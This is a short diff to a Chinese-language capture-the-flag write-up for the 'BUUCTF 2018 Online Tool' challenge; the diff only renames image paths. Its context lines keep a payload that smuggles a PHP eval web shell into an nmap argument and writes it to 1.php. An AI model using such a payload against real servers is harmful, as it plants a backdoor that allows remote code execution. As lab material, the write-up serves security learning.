@@ -55,10 +55,10 @@ system('groups '.$username);
 ?host='<?php eval($_POST[1]);?> -oG 1.php '
 ```
 
-![](./img/[BUUCTF 2018]Online Tool-1.png)
+![](./img/[BUUCTF2018]OnlineTool-1.png)
 
 写入木马
 
-![](./img/[BUUCTF 2018]Online Tool-2.png)
+![](./img/[BUUCTF2018]OnlineTool-2.png)
 
 [参考文章](https://blog.csdn.net/m0_62422842/article/details/125451022)
